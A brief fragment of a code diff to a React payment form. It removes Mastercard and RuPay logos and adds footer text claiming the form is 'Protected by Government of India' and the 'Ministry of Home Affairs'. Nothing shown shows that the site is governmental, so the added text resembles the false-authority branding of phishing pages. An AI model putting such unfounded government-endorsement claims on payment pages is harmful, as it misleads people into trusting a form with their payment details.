-              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" className="h-6" />
-              <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/8b/RuPay.svg/1200px-RuPay.svg.png" alt="RuPay" className="h-6" />
-            </div>
-          </div>
-        </form>
-      </div>
+        <div className="text-xs text-gray-500 text-center mt-4">
+          <p>Protected by Government of India</p>
+          <p>Ministry of Home Affairs</p>
+        </div>
+      </form>
     </div>
   );
 };
